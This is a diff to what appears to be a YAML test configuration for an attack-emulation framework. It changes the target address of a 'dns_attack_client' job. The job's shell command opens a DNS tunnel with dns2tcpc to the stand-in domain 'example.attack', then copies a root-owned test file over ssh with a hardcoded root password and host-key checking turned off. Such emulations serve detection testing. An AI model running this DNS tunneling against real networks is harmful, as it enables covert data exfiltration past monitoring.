@@ -29,7 +29,7 @@ dns_attack_client:
         type: shell
         val: >-
           set -x;
-          dns2tcpc -z example.attack -k {{ variables.passphrase }} 192.168.0.10 -r ssh -l 12345 {{ variables.compression }} -T {{ variables.record_type }} & sleep 1;
+          dns2tcpc -z example.attack -k {{ variables.passphrase }} 127.0.0.1 -r ssh -l 12345 {{ variables.compression }} -T {{ variables.record_type }} & sleep 1;
           rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 12345" 127.0.0.1:/root/test-file /tmp/
     artifacts_to_collect:
       - type: files
